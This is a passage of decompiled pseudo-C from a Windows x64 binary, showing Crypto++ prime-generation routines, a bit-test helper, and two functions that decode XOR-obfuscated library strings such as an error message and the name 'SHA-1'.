  char v136; // [rsp+270h] [rbp+170h]
  char v137; // [rsp+298h] [rbp+198h]
  unsigned __int64 v138; // [rsp+2A0h] [rbp+1A0h]
  void *v139; // [rsp+2A8h] [rbp+1A8h]
  __int64 v140; // [rsp+2B0h] [rbp+1B0h]
  __int64 (__fastcall **v141)(void *); // [rsp+2C0h] [rbp+1C0h]
  int v142; // [rsp+2D8h] [rbp+1D8h]
  char Dst; // [rsp+2E0h] [rbp+1E0h]
  __int64 v144; // [rsp+2F0h] [rbp+1F0h]
  __int64 v145; // [rsp+2F8h] [rbp+1F8h]
  __int64 (__fastcall **v146)(void *); // [rsp+300h] [rbp+200h]
  int v147; // [rsp+318h] [rbp+218h]
  char v148; // [rsp+320h] [rbp+220h]
  __int64 v149; // [rsp+330h] [rbp+230h]
  __int64 v150; // [rsp+338h] [rbp+238h]
  __int64 (__fastcall **v151)(void *); // [rsp+340h] [rbp+240h]
  __int64 (__fastcall **v152)(); // [rsp+348h] [rbp+248h]
  __int64 v153[10]; // [rsp+3A0h] [rbp+2A0h]

  v116 = -2i64;
  v3 = a3;
  v4 = a2;
  v103 = (unsigned __int8 (__fastcall ***)(_QWORD, int *))a2;
  v90 = a1;
  v5 = sub_14004B4E0(&v84);
  v6 = sub_14003C000((__int64)&v136, v5);
  sub_14003AE30(v3, (__int64)&v95, (__int64)&unk_1400A9E68, v6);
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v7);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v86 = &off_1400A9910;
  v87 = 2i64;
  v88 = sub_14003A000(0x10ui64);
  v8 = 0;
  v89 = 0;
  *((_QWORD *)v88 + 1) = 0i64;
  *(_QWORD *)v88 = 0i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, void *, void *, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 8i64))(
          v3,
          &unk_1400A9E6C,
          &CryptoPP::cls_097 `RTTI Type Descriptor',
          &v86) )
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, int *, void (__fastcall ****)(_QWORD, signed __int64)))(*(_QWORD *)v3 + 8i64))(
            v3,
            "BitLength",
            &int `RTTI Type Descriptor',
            &v85) )
    {
      v140 = 15i64;
      v139 = 0i64;
      v137 = 0;
      sub_140004F20(&v137, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v141);
      v141 = &off_1400A8798;
      v142 = 1;
      v145 = 15i64;
      v144 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v137, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v141 = &off_1400A8798;
      CxxThrowException(&v141, &_TI3_AVcls_001_CryptoPP__);
    }
    v9 = sub_14004A6C0(&v113, (signed int)v85);
    sub_14003C670((__int64)&v86, v9);
    v10 = Memory;
    memset(Memory, 0, 8 * v114);
    free(v10);
  }
  if ( v98 == 1 )
  {
    if ( v89 != 1 )
      goto LABEL_56;
    v19 = v96;
    if ( v96 )
    {
      v20 = (char *)v97 + 8 * (v96 - 1);
      do
      {
        if ( *v20 )
          break;
        --v20;
        --v19;
      }
      while ( v19 );
    }
    v21 = v87;
    if ( v87 )
    {
      v22 = (char *)v88 + 8 * (v87 - 1);
      do
      {
        if ( *v22 )
          break;
        --v22;
        --v21;
      }
      while ( v21 );
    }
    if ( (_DWORD)v19 == (_DWORD)v21 )
    {
      v23 = (unsigned int)v19;
      if ( (_DWORD)v19 )
      {
        v24 = (unsigned __int64 *)((char *)v88 + 8 * (unsigned int)v19);
        while ( 1 )
        {
          --v23;
          --v24;
          v25 = *(unsigned __int64 *)((char *)v24 + (_BYTE *)v97 - (_BYTE *)v88);
          if ( v25 > *v24 )
            break;
          if ( v25 < *v24 )
          {
            v26 = -1;
            goto LABEL_52;
          }
          if ( !v23 )
            goto LABEL_49;
        }
        v26 = 1;
      }
      else
      {
LABEL_49:
        v26 = 0;
      }
    }
    else
    {
      v26 = -1;
      if ( (unsigned int)v19 > (unsigned int)v21 )
        v26 = 1;
    }
LABEL_52:
    v18 = -v26;
  }
  else
  {
    if ( v89 == 1 )
    {
LABEL_54:
      v140 = 15i64;
      v139 = 0i64;
      v137 = 0;
      sub_140004F20(&v137, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v141);
      v141 = &off_1400A8798;
      v142 = 1;
      v145 = 15i64;
      v144 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v137, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v141 = &off_1400A8798;
      CxxThrowException(&v141, &_TI3_AVcls_001_CryptoPP__);
    }
    v11 = v96;
    if ( v96 )
    {
      v12 = (char *)v97 + 8 * (v96 - 1);
      do
      {
        if ( *v12 )
          break;
        --v12;
        --v11;
      }
      while ( v11 );
    }
    v13 = v87;
    if ( v87 )
    {
      v14 = (char *)v88 + 8 * (v87 - 1);
      do
      {
        if ( *v14 )
          break;
        --v14;
        --v13;
      }
      while ( v13 );
    }
    if ( (_DWORD)v11 == (_DWORD)v13 )
    {
      v15 = (unsigned int)v11;
      if ( (_DWORD)v11 )
      {
        v16 = (unsigned __int64 *)((char *)v88 + 8 * (unsigned int)v11);
        while ( 1 )
        {
          --v15;
          --v16;
          v17 = *(unsigned __int64 *)((char *)v16 + (_BYTE *)v97 - (_BYTE *)v88);
          if ( v17 > *v16 )
            break;
          if ( v17 < *v16 )
          {
            v18 = -1;
            goto LABEL_53;
          }
          if ( !v15 )
            goto LABEL_27;
        }
        v18 = 1;
      }
      else
      {
LABEL_27:
        v18 = 0;
      }
    }
    else
    {
      v18 = -1;
      if ( (unsigned int)v11 > (unsigned int)v13 )
        v18 = 1;
    }
  }
LABEL_53:
  if ( v18 > 0 )
    goto LABEL_54;
LABEL_56:
  v27 = sub_14004B4E0(&v84);
  v28 = sub_14003C000((__int64)&v146, v27);
  sub_14003AE30(v3, (__int64)&v104, (__int64)"EquivalentTo", v28);
  v29 = sub_14004B3C0(&v84);
  v30 = sub_14003C000((__int64)&v141, v29);
  sub_14003AE30(v3, (__int64)&v91, (__int64)"Mod", v30);
  if ( v107 == 1 || v94 == 1 )
    goto LABEL_126;
  v31 = v105;
  if ( v105 )
  {
    v32 = (char *)v106 + 8 * (v105 - 1);
    do
    {
      if ( *v32 )
        break;
      --v32;
      --v31;
    }
    while ( v31 );
  }
  v33 = v92;
  if ( v92 )
  {
    v34 = (char *)v93 + 8 * (v92 - 1);
    do
    {
      if ( *v34 )
        break;
      --v34;
      --v33;
    }
    while ( v33 );
  }
  if ( (_DWORD)v31 == (_DWORD)v33 )
  {
    v35 = (unsigned int)v31;
    if ( (_DWORD)v31 )
    {
      v36 = (unsigned __int64 *)((char *)v93 + 8 * (unsigned int)v31);
      while ( 1 )
      {
        --v35;
        --v36;
        v37 = *(unsigned __int64 *)((char *)v36 + (_BYTE *)v106 - (_BYTE *)v93);
        if ( v37 > *v36 )
          break;
        if ( v37 < *v36 )
        {
          v38 = -1;
          goto LABEL_78;
        }
        if ( !v35 )
          goto LABEL_75;
      }
      v38 = 1;
    }
    else
    {
LABEL_75:
      v38 = 0;
    }
  }
  else
  {
    v38 = -1;
    if ( (unsigned int)v31 > (unsigned int)v33 )
      v38 = 1;
  }
LABEL_78:
  if ( v38 >= 0 )
  {
LABEL_126:
    v140 = 15i64;
    v139 = 0i64;
    v137 = 0;
    sub_140004F20(&v137, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v146);
    v146 = &off_1400A8798;
    v147 = 1;
    v150 = 15i64;
    v149 = 0i64;
    v148 = 0;
    sub_140004DF0(&v148, &v137, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v146 = &off_1400A8798;
    CxxThrowException(&v146, &_TI3_AVcls_001_CryptoPP__);
  }
  v39 = 0;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, void (__fastcall ****)(_QWORD, signed __int64)))(*(_QWORD *)v3 + 8i64))(
         v3,
         "RandomNumberType",
         &enum  CryptoPP::cls_097::cls_100 `RTTI Type Descriptor',
         &v85) )
  {
    v39 = (signed int)v85;
  }
  v40 = 0i64;
  v85 = 0i64;
  v111 = 0i64;
  v112 = 0i64;
  v109 = 0i64;
  v110 = 0i64;
  v108 = 0;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)v3 + 8i64))(
         v3,
         "Seed",
         &CryptoPP::cls_053 `RTTI Type Descriptor',
         &v108) )
  {
    sub_1400565B0((__int64)v153, 0i64);
    sub_14005F7E0((__int64)&v151, (__int64)v153, 48);
    v151 = &off_1400A9C28;
    v152 = &off_1400ACF98;
    sub_140045C40((__int64)&v95, (__int64)&v151);
    sub_140045C40((__int64)&v86, (__int64)&v151);
    sub_140045C40((__int64)&v104, (__int64)&v151);
    sub_140045C40((__int64)&v91, (__int64)&v151);
    sub_14003AB00(&v151, v39, 2);
    if ( v108 )
    {
      v41 = v111;
      v42 = v112;
    }
    else
    {
      v41 = v110;
      v42 = v109;
    }
    sub_140060610(&v151, (__int64)v42, v41);
    sub_1400609E0((__int64)&v151);
    v43 = sub_140056B70((__int64)v153);
    sub_140022F10((__int64)&v137, v43);
    v44 = v138;
    v45 = v139;
    sub_140056D00(v153, (__int64)v139, v138);
    v46 = operator new(0x28ui64);
    v117 = v46;
    v40 = (void (__fastcall ***)(_QWORD, signed __int64))(v46 ? sub_14003BA00((__int64)v46, v45, v44) : 0i64);
    v85 = v40;
    memset(v45, 0, v138);
    free(v45);
    sub_14005F8B0((__int64)&v151);
    sub_1400566F0(v153);
    v4 = (__int64)v40;
    if ( !v40 )
      v4 = (__int64)v103;
  }
  if ( v39 )
  {
    if ( v39 != 1 )
    {
      sub_140003D30(&v137, byte_1400A3400);
      sub_1400235E0((std::exception *)v153, &v137);
      CxxThrowException(v153, &_TI3_AVcls_001_CryptoPP__);
    }
    v47 = (*(__int64 (__fastcall **)(__int64, const char *, const struct CryptoPP::cls_101 **, unsigned __int8 (__fastcall ****)(_QWORD, int *)))(*(_QWORD *)v3 + 8i64))(
            v3,
            "PointerToPrimeSelector",
            &CryptoPP::cls_101 const * `RTTI Type Descriptor',
            &v103);
    v48 = 0i64;
    if ( v47 )
      v48 = v103;
    do
    {
      if ( ++v8 == 16 )
      {
        sub_14003C000((__int64)&v99, (__int64)&v95);
        if ( !(unsigned __int8)sub_14005BBD0((__int64)&v99, (__int64)&v86, (__int64)&v104, (__int64)&v91, v48) )
          goto LABEL_119;
        sub_14003C670(v90, (__int64)&v99);
        v49 = sub_14005BBD0((__int64)&v99, (__int64)&v86, (__int64)&v104, (__int64)&v91, v48);
        v50 = v101;
        if ( !v49 )
        {
          memset(v101, 0, 8 * v100);
          free(v50);
          v58 = v112;
          memset(v112, 0, v111);
          v59 = v58;
          goto LABEL_115;
        }
        memset(v101, 0, 8 * v100);
        free(v50);
      }
      v51 = v90;
      sub_14004A820(v90, v4, (__int64)&v95, (__int64)&v86);
      v52 = sub_14005E360(&v86);
      sub_14003C0E0((__int64)&v113, v52);
      sub_1400246E0((__int64)&v133, (__int64)&v91);
      v53 = sub_140024740((__int64)&v124, v51);
      v54 = sub_14003B190(v53, (__int64)&v86);
      v55 = (unsigned __int8)sub_14005BBD0(v51, v54, (__int64)&v104, (__int64)&v91, v48);
      v56 = v126;
      memset(v126, 0, 8 * v125);
      free(v56);
      v57 = v135;
      memset(v135, 0, 8 * v134);
      free(v57);
      memset(Memory, 0, 8 * v114);
      free(Memory);
    }
    while ( !(_BYTE)v55 );
    sub_140037260((__int64)&v108);
    sub_140088AF0((__int64 (__fastcall ****)(_QWORD, signed __int64))&v85);
    sub_1400242B0(&v91);
    sub_1400242B0(&v104);
    sub_1400242B0(&v86);
    sub_1400242B0(&v95);
    return 1;
  }
  v60 = sub_14004B3C0(&v84);
  if ( sub_1400246C0((__int64)&v91, v60) )
  {
    sub_14004A820(v90, v4, (__int64)&v95, (__int64)&v86);
    goto LABEL_114;
  }
  v61 = sub_140024710((__int64)&v121, (__int64)&v104, (__int64)&v95);
  sub_1400247D0((__int64)&v130, v61);
  sub_140024740((__int64)&v99, (__int64)&v95);
  v62 = v132;
  memset(v132, 0, 8 * v131);
  free(v62);
  v63 = v123;
  memset(v123, 0, 8 * v122);
  free(v63);
  if ( v89 == 1 )
  {
    if ( v102 != 1 )
      goto LABEL_119;
    v64 = -(signed int)sub_14004A0B0((__int64)&v86, (__int64)&v99);
  }
  else
  {
    if ( v102 == 1 )
    {
LABEL_113:
      v65 = sub_140024710((__int64)&v127, (__int64)&v86, (__int64)&v99);
      v66 = sub_140024770((__int64)&v118, v65, (__int64)&v91);
      v67 = sub_14004B4E0(&v84);
      v68 = v90;
      sub_14004A820(v90, v4, v67, v66);
      v69 = v120;
      memset(v120, 0, 8 * v119);
      free(v69);
      v70 = v129;
      memset(v129, 0, 8 * v128);
      free(v70);
      sub_14003D430(v68);
      sub_14003D540(v68, (__int64)&v99);
      v71 = v101;
      memset(v101, 0, 8 * v100);
      free(v71);
LABEL_114:
      v72 = v112;
      memset(v112, 0, v111);
      v59 = v72;
LABEL_115:
      free(v59);
      if ( v40 )
        (**v40)(v40, 1i64);
      v73 = v93;
      memset(v93, 0, 8 * v92);
      free(v73);
      v74 = v106;
      memset(v106, 0, 8 * v105);
      free(v74);
      v75 = v88;
      memset(v88, 0, 8 * v87);
      free(v75);
      v76 = v97;
      memset(v97, 0, 8 * v96);
      free(v76);
      return 1;
    }
    v64 = sub_14004A0B0((__int64)&v86, (__int64)&v99);
  }
  if ( v64 >= 0 )
    goto LABEL_113;
LABEL_119:
  v78 = v101;
  memset(v101, 0, 8 * v100);
  free(v78);
  v79 = v112;
  memset(v112, 0, v111);
  free(v79);
  if ( v40 )
    (**v40)(v40, 1i64);
  v80 = v93;
  memset(v93, 0, 8 * v92);
  free(v80);
  v81 = v106;
  memset(v106, 0, 8 * v105);
  free(v81);
  v82 = v88;
  memset(v88, 0, 8 * v87);
  free(v82);
  v83 = v97;
  memset(v97, 0, 8 * v96);
  free(v83);
  return 0;
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);
// 14004B3C0: using guessed type __int64 __fastcall sub_14004B3C0(_QWORD);
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 14005E360: using guessed type __int64 __fastcall sub_14005E360(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9208: using guessed type const struct CryptoPP::cls_101 *CryptoPP::cls_101 const * `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140048010) ----------------------------------------------------
char __fastcall sub_140048010(__int64 a1, unsigned __int64 a2)
{
  char v2; // r8
  unsigned __int64 v3; // rdx
  char result; // al

  v2 = a2;
  v3 = a2 >> 6;
  if ( v3 < *(_QWORD *)(a1 + 16) )
    result = (*(_QWORD *)(*(_QWORD *)(a1 + 24) + 8 * v3) >> (v2 & 0x3F)) & 1;
  else
    result = 0;
  return result;
}

//----- (0000000140048040) ----------------------------------------------------
_QWORD *__fastcall sub_140048040(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA9BC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA9BC & 1 )
  {
    v5 = byte_1400DA9B8;
  }
  else
  {
    v4 = 69069 * dword_1400DA86C + 1234567;
    v1 = dword_1400DA9BC | 1;
    dword_1400DA86C = v4;
    dword_1400DA9BC |= 1u;
    dword_1400DA864 = HIWORD(dword_1400DA864) + 36969 * (unsigned __int16)dword_1400DA864;
    LOBYTE(v4) = (BYTE2(dword_1400DA870) + 80 * dword_1400DA870) ^ v4;
    dword_1400DA870 = HIWORD(dword_1400DA870) + 18000 * (unsigned __int16)dword_1400DA870;
    v5 = (((unsigned int)dword_1400DA868 >> 13) ^ 32 * dword_1400DA868 ^ dword_1400DA868) + v4;
    dword_1400DA868 ^= ((unsigned int)dword_1400DA868 >> 13) ^ 32 * (dword_1400DA868 ^ (dword_1400DA868 << 12));
    byte_1400DA9B8 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA9BC = v1 | 2;
    byte_1400DA9C0[0] = v5 ^ 0x42;
    byte_1400DA9C1 = (v5 - 1) ^ 0x75;
    byte_1400DA9C2 = (v5 - 2) ^ 0x66;
    byte_1400DA9C3 = (v5 - 3) ^ 0x66;
    byte_1400DA9C4 = (v5 - 4) ^ 0x65;
    byte_1400DA9C5 = (v5 - 5) ^ 0x72;
    byte_1400DA9C6 = (v5 - 6) ^ 0x65;
    byte_1400DA9C7 = (v5 - 7) ^ 0x64;
    byte_1400DA9C8 = (v5 - 8) ^ 0x54;
    byte_1400DA9C9 = (v5 - 9) ^ 0x72;
    byte_1400DA9CA = (v5 - 10) ^ 0x61;
    byte_1400DA9CB = (v5 - 11) ^ 0x6E;
    byte_1400DA9CC = (v5 - 12) ^ 0x73;
    byte_1400DA9CD = (v5 - 13) ^ 0x66;
    byte_1400DA9CE = (v5 - 14) ^ 0x6F;
    byte_1400DA9CF = (v5 - 15) ^ 0x72;
    byte_1400DA9D0 = (v5 - 16) ^ 0x6D;
    byte_1400DA9D1 = (v5 - 17) ^ 0x61;
    byte_1400DA9D2 = (v5 - 18) ^ 0x74;
    byte_1400DA9D3 = (v5 - 19) ^ 0x69;
    byte_1400DA9D4 = (v5 - 20) ^ 0x6F;
    byte_1400DA9D5 = (v5 - 21) ^ 0x6E;
    byte_1400DA9D6 = (v5 - 22) ^ 0x3A;
    byte_1400DA9D7 = (v5 - 23) ^ 0x20;
    byte_1400DA9D8 = (v5 - 24) ^ 0x74;
    byte_1400DA9D9 = (v5 - 25) ^ 0x68;
    byte_1400DA9DA = (v5 - 26) ^ 0x69;
    byte_1400DA9DB = (v5 - 27) ^ 0x73;
    byte_1400DA9DC = (v5 - 28) ^ 0x20;
    byte_1400DA9DD = (v5 - 29) ^ 0x6F;
    byte_1400DA9DE = (v5 - 30) ^ 0x62;
    byte_1400DA9DF = (v5 - 31) ^ 0x6A;
    byte_1400DA9E0 = (v5 - 32) ^ 0x65;
    byte_1400DA9E1 = (v5 - 33) ^ 0x63;
    byte_1400DA9E2 = (v5 - 34) ^ 0x74;
    byte_1400DA9E3 = (v5 - 35) ^ 0x20;
    byte_1400DA9E4 = (v5 - 36) ^ 0x64;
    byte_1400DA9E5 = (v5 - 37) ^ 0x6F;
    byte_1400DA9E6 = (v5 - 38) ^ 0x65;
    byte_1400DA9E7 = (v5 - 39) ^ 0x73;
    byte_1400DA9E8 = (v5 - 40) ^ 0x6E;
    byte_1400DA9E9 = (v5 - 41) ^ 0x27;
    byte_1400DA9EA = (v5 - 42) ^ 0x74;
    byte_1400DA9EB = (v5 - 43) ^ 0x20;
    byte_1400DA9EC = (v5 - 44) ^ 0x61;
    byte_1400DA9ED = (v5 - 45) ^ 0x6C;
    byte_1400DA9EE = (v5 - 46) ^ 0x6C;
    byte_1400DA9EF = (v5 - 47) ^ 0x6F;
    byte_1400DA9F0 = (v5 - 48) ^ 0x77;
    byte_1400DA9F1 = (v5 - 49) ^ 0x20;
    byte_1400DA9F2 = (v5 - 50) ^ 0x69;
    byte_1400DA9F3 = (v5 - 51) ^ 0x6E;
    byte_1400DA9F4 = (v5 - 52) ^ 0x70;
    byte_1400DA9F5 = (v5 - 53) ^ 0x75;
    byte_1400DA9F6 = (v5 - 54) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x37ui64 )
  {
    sub_140004790(Src, 0x37ui64, 0i64);
    v5 = byte_1400DA9B8;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  *((_DWORD *)v6 + 12) = 0;
  *((_WORD *)v6 + 26) = 0;
  *((_BYTE *)v6 + 54) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 55i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 55) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA9C0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x37 );
  return v3;
}
// 1400DA864: using guessed type int dword_1400DA864;
// 1400DA868: using guessed type int dword_1400DA868;
// 1400DA86C: using guessed type int dword_1400DA86C;
// 1400DA870: using guessed type int dword_1400DA870;
// 1400DA9B8: using guessed type char byte_1400DA9B8;
// 1400DA9BC: using guessed type int dword_1400DA9BC;
// 1400DA9C1: using guessed type char byte_1400DA9C1;
// 1400DA9C2: using guessed type char byte_1400DA9C2;
// 1400DA9C3: using guessed type char byte_1400DA9C3;
// 1400DA9C4: using guessed type char byte_1400DA9C4;
// 1400DA9C5: using guessed type char byte_1400DA9C5;
// 1400DA9C6: using guessed type char byte_1400DA9C6;
// 1400DA9C7: using guessed type char byte_1400DA9C7;
// 1400DA9C8: using guessed type char byte_1400DA9C8;
// 1400DA9C9: using guessed type char byte_1400DA9C9;
// 1400DA9CA: using guessed type char byte_1400DA9CA;
// 1400DA9CB: using guessed type char byte_1400DA9CB;
// 1400DA9CC: using guessed type char byte_1400DA9CC;
// 1400DA9CD: using guessed type char byte_1400DA9CD;
// 1400DA9CE: using guessed type char byte_1400DA9CE;
// 1400DA9CF: using guessed type char byte_1400DA9CF;
// 1400DA9D0: using guessed type char byte_1400DA9D0;
// 1400DA9D1: using guessed type char byte_1400DA9D1;
// 1400DA9D2: using guessed type char byte_1400DA9D2;
// 1400DA9D3: using guessed type char byte_1400DA9D3;
// 1400DA9D4: using guessed type char byte_1400DA9D4;
// 1400DA9D5: using guessed type char byte_1400DA9D5;
// 1400DA9D6: using guessed type char byte_1400DA9D6;
// 1400DA9D7: using guessed type char byte_1400DA9D7;
// 1400DA9D8: using guessed type char byte_1400DA9D8;
// 1400DA9D9: using guessed type char byte_1400DA9D9;
// 1400DA9DA: using guessed type char byte_1400DA9DA;
// 1400DA9DB: using guessed type char byte_1400DA9DB;
// 1400DA9DC: using guessed type char byte_1400DA9DC;
// 1400DA9DD: using guessed type char byte_1400DA9DD;
// 1400DA9DE: using guessed type char byte_1400DA9DE;
// 1400DA9DF: using guessed type char byte_1400DA9DF;
// 1400DA9E0: using guessed type char byte_1400DA9E0;
// 1400DA9E1: using guessed type char byte_1400DA9E1;
// 1400DA9E2: using guessed type char byte_1400DA9E2;
// 1400DA9E3: using guessed type char byte_1400DA9E3;
// 1400DA9E4: using guessed type char byte_1400DA9E4;
// 1400DA9E5: using guessed type char byte_1400DA9E5;
// 1400DA9E6: using guessed type char byte_1400DA9E6;
// 1400DA9E7: using guessed type char byte_1400DA9E7;
// 1400DA9E8: using guessed type char byte_1400DA9E8;
// 1400DA9E9: using guessed type char byte_1400DA9E9;
// 1400DA9EA: using guessed type char byte_1400DA9EA;
// 1400DA9EB: using guessed type char byte_1400DA9EB;
// 1400DA9EC: using guessed type char byte_1400DA9EC;
// 1400DA9ED: using guessed type char byte_1400DA9ED;
// 1400DA9EE: using guessed type char byte_1400DA9EE;
// 1400DA9EF: using guessed type char byte_1400DA9EF;
// 1400DA9F0: using guessed type char byte_1400DA9F0;
// 1400DA9F1: using guessed type char byte_1400DA9F1;
// 1400DA9F2: using guessed type char byte_1400DA9F2;
// 1400DA9F3: using guessed type char byte_1400DA9F3;
// 1400DA9F4: using guessed type char byte_1400DA9F4;
// 1400DA9F5: using guessed type char byte_1400DA9F5;
// 1400DA9F6: using guessed type char byte_1400DA9F6;

//----- (0000000140048460) ----------------------------------------------------
_QWORD *__fastcall sub_140048460(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA9F8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA9F8 & 1 )
  {
    v5 = byte_1400DA9F7;
  }
  else
  {
    v4 = 69069 * dword_1400DA86C + 1234567;
    v1 = dword_1400DA9F8 | 1;
    dword_1400DA86C = v4;
    dword_1400DA9F8 |= 1u;
    dword_1400DA864 = HIWORD(dword_1400DA864) + 36969 * (unsigned __int16)dword_1400DA864;
    LOBYTE(v4) = (BYTE2(dword_1400DA870) + 80 * dword_1400DA870) ^ v4;
    dword_1400DA870 = HIWORD(dword_1400DA870) + 18000 * (unsigned __int16)dword_1400DA870;
    v5 = (((unsigned int)dword_1400DA868 >> 13) ^ 32 * dword_1400DA868 ^ dword_1400DA868) + v4;
    dword_1400DA868 ^= ((unsigned int)dword_1400DA868 >> 13) ^ 32 * (dword_1400DA868 ^ (dword_1400DA868 << 12));
    byte_1400DA9F7 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA9F8 = v1 | 2;
    byte_1400DA9FC[0] = v5 ^ 0x53;
    byte_1400DA9FD = (v5 - 1) ^ 0x48;
    byte_1400DA9FE = (v5 - 2) ^ 0x41;
    byte_1400DA9FF = (v5 - 3) ^ 0x2D;
    byte_1400DAA00 = (v5 - 4) ^ 0x31;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 5ui64 )
  {
    sub_140004790(Src, 5ui64, 0i64);
    v5 = byte_1400DA9F7;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_BYTE *)v6 + 4) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 5i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 5) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA9FC[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 5 );
  return v3;
}
// 1400DA864: using guessed type int dword_1400DA864;
// 1400DA868: using guessed type int dword_1400DA868;
// 1400DA86C: using guessed type int dword_1400DA86C;
// 1400DA870: using guessed type int dword_1400DA870;
// 1400DA9F7: using guessed type char byte_1400DA9F7;
// 1400DA9F8: using guessed type int dword_1400DA9F8;
// 1400DA9FD: using guessed type char byte_1400DA9FD;
// 1400DA9FE: using guessed type char byte_1400DA9FE;
// 1400DA9FF: using guessed type char byte_1400DA9FF;
// 1400DAA00: using guessed type char byte_1400DAA00;

//----- (0000000140048610) ----------------------------------------------------
__int64 __fastcall sub_140048610(__int64 a1, _DWORD *a2)
{
  return sub_140061CA0(*(_DWORD **)(a1 + 184), a2);
}

//----- (0000000140048620) ----------------------------------------------------
__int64 sub_140048620()
{
  char v1; // [rsp+10h] [rbp+10h]

  return sub_14004B4E0(&v1);
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);

//----- (0000000140048630) ----------------------------------------------------
void __fastcall sub_140048630(__int64 a1)
{
  sub_140061C50(*(_DWORD **)(a1 + 184));
}

//----- (0000000140048640) ----------------------------------------------------
__int64 __fastcall sub_140048640(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_14003D010(a2, (__int64)&v7);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (00000001400486A0) ----------------------------------------------------
signed __int64 __fastcall sub_1400486A0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  _QWORD *v4; // rcx
  __int64 v5; // rax
  _QWORD *v6; // rdx
  const void *v8; // r8
  void *v9; // rcx
  __int64 v10; // rax
  __int64 v11; // r8
  __int64 v12; // r9
  unsigned __int64 v13; // rcx
  _QWORD *v14; // r10
  unsigned int v15; // edx
  unsigned __int64 v16; // r9
  signed __int64 v17; // r8
  __int64 v18; // rcx

  v2 = a2;
  v3 = a1;
  if ( *(_DWORD *)(a2 + 32) != 1 )
  {
    v4 = *(_QWORD **)(a2 + 24);
